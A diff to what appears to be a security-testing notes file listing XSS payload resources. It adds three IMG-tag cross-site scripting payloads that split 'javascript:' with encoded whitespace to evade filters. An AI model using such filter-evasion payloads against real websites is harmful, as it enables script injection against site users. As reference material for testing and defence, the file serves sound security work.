@@ -2,6 +2,12 @@
 https://github.com/payloadbox/xss-payload-list
 ##### For filter bypass
 https://github.com/terjanq/Tiny-XSS-Payloads
+## XSS with filter evasion
+```
+<IMG SRC="jav&#x09;ascript:alert('XSS');">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+```
 ##### XSS Filter Evasion Cheat Sheet
 https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
 ### For html Injection
